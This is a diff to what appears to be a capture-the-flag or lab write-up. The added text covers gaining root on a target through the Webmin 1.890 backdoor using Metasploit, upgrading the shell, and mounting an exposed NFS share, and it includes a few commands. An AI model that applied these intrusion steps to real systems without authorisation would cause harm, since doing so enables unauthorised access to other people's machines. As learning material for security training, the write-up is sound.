@@ -167,6 +167,7 @@ by Ben "epi" Risher 🤓                 ver: 2.7.3
 
 ## Initial Access
 
+### Method 1 - Webmin
 - From nmap we can see we have webmin 1.890 running on port 10000
 - This version is vulnerable to a backdoor exploit that we can run using metasploit
 
@@ -262,7 +263,7 @@ WebminCore.pm
 WebminUI
 ```
 
-### Upgrading the shell
+#### Upgrading the shell
 
 - To make this shell more usable we can utilise the metsploit feature meterperter shell
 
@@ -362,5 +363,23 @@ Process 32222 created.
 Channel 2 created.
 python -c 'import pty; pty.spawn("/bin/bash")'
 root@srv-99-590:/usr/share/webmin#
+```
+
+- This webmin exploit also allows us to log directly in as root
+
+### Method 2 - NFS
+
+- We can mount the nfs share and acces the files on the webserver
+
+```
+┌──(kali㉿kali-99-590)-[~]
+└─$ sudo mount -t nfs 10.1.26.30:/ /mnt/nfs -o nolock 
+┌──(kali㉿kali-99-590)-[~]
+└─$ tree /mnt/nfs
+/mnt/nfs
+└── var
+    └── www
+        └── html
+            └── index.html
 ```
 
